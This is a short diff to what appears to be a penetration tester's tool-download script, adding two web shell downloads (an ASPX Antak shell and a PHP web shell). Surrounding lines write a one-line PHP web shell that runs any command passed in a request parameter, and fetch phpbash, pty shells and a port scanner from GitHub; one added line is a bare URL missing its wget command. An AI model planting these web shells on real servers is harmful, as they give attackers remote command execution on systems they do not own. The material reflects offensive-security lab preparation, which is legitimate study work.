@@ -226,6 +226,8 @@ cd Shells
 cp -r /usr/share/webshells/ .
 echo '<?php system($_REQUEST['cmd']); ?>' > shell.php
 wget https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php
+wget https://raw.githubusercontent.com/xl7dev/WebShell/refs/heads/master/Aspx/Antak%20Webshell.aspx
+https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php
 wget https://github.com/R0gueSec/ToolsDownloaders/releases/download/PDF/StabilizingShellwithPython.pdf
 git clone https://github.com/infodox/python-pty-shells.git
 wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
